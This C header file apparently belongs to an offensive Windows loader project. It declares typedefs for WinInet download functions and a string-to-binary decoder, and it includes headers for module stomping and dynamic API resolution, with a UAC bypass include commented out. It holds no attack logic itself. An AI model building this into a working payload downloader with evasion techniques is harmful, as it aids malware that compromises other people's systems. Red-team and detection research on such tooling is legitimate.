#pragma once
#include "definitions.h"
#include <WinInet.h>
#include <stdio.h>
#include <wincrypt.h>
#include "DynamicFunctionResolvers.h"
//#include "EvtViewerUACBypass.h"
#include "ModuleStomp.h"

#pragma comment(lib,"Wininet.lib") 
#pragma comment(lib, "Crypt32.lib")

void do_request(const char* hostName, const char* resourcePath, const char* targetHeader);
void parseUrl(char* inUrl, char* outHostName, char* outFilePath);
void randomStrGenerator(char* rand_str);


//create winapi function definitions for functions used to download files.
typedef HINTERNET(WINAPI* t_InternetOpenA) (
	LPCSTR lpszAgent,
	DWORD  dwAccessType,
	LPCSTR lpszProxy,
	LPCSTR lpszProxyBypass,
	DWORD  dwFlags
);

typedef HINTERNET(WINAPI* t_InternetConnectA)(
	 HINTERNET     hInternet,
	 LPCSTR        lpszServerName,
	 INTERNET_PORT nServerPort,
	 LPCSTR        lpszUserName,
	 LPCSTR        lpszPassword,
	 DWORD         dwService,
	 DWORD         dwFlags,
	 DWORD_PTR     dwContext
);

typedef HINTERNET(WINAPI* t_HttpOpenRequestA)(
	 HINTERNET hConnect,
	 LPCSTR    lpszVerb,
	 LPCSTR    lpszObjectName,
	 LPCSTR    lpszVersion,
	 LPCSTR    lpszReferrer,
	 LPCSTR* lplpszAcceptTypes,
	 DWORD     dwFlags,
	 DWORD_PTR dwContext
);

typedef BOOL(WINAPI* t_HttpSendRequestA)(
	 HINTERNET hRequest,
	 LPCSTR    lpszHeaders,
	 DWORD     dwHeadersLength,
	 LPVOID    lpOptional,
	 DWORD     dwOptionalLength
);

typedef BOOL(WINAPI* t_HttpQueryInfoA)(
	 HINTERNET hRequest,
	 DWORD     dwInfoLevel,
	 LPVOID    lpBuffer,
	 LPDWORD   lpdwBufferLength,
	 LPDWORD   lpdwIndex
);

typedef BOOL(WINAPI* t_InternetReadFile)(
	 HINTERNET hFile,
	 LPVOID    lpBuffer,
	 DWORD     dwNumberOfBytesToRead,
	 LPDWORD   lpdwNumberOfBytesRead
);

typedef BOOL(WINAPI* t_InternetCloseHandle)(
	 HINTERNET hInternet
);

typedef BOOL(WINAPI* t_CryptStringToBinaryW)(
	    LPCWSTR pszString,
	    DWORD   cchString,
	    DWORD   dwFlags,
	    BYTE* pbBinary,
		DWORD* pcbBinary,
	    DWORD* pdwSkip,
	    DWORD* pdwFlags
);
